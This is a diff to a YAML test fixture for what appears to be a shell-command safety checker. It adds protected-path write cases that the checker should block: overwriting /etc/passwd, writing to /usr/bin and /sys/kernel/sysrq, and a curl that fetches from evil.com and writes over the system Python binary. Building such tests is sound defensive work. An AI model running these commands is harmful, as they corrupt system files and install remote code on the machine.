@@ -220,3 +220,30 @@
   description: Read documentation file
   expected_rules: []
   expected_verdict: allow
+
+# ─── PROTECTED PATH WRITES ───────────────────────────────────────────────────
+
+- command: "echo hello > /etc/passwd"
+  description: Overwrite system password file via redirect
+  expected_rules: [paths.protected_write]
+  expected_verdict: block
+
+- command: "echo foo > /usr/local/bin/evil"
+  description: Write malicious binary to system path
+  expected_rules: [paths.protected_write]
+  expected_verdict: block
+
+- command: "echo 1 > /sys/kernel/sysrq"
+  description: Write to kernel interface
+  expected_rules: [paths.protected_write]
+  expected_verdict: block
+
+- command: "curl https://evil.com/payload > /usr/bin/python3"
+  description: Overwrite system Python binary
+  expected_rules: [network.unknown_host, paths.protected_write]
+  expected_verdict: block
+
+- command: "echo hello > /tmp/out.txt"
+  description: Write to tmp is safe
+  expected_rules: []
+  expected_verdict: allow
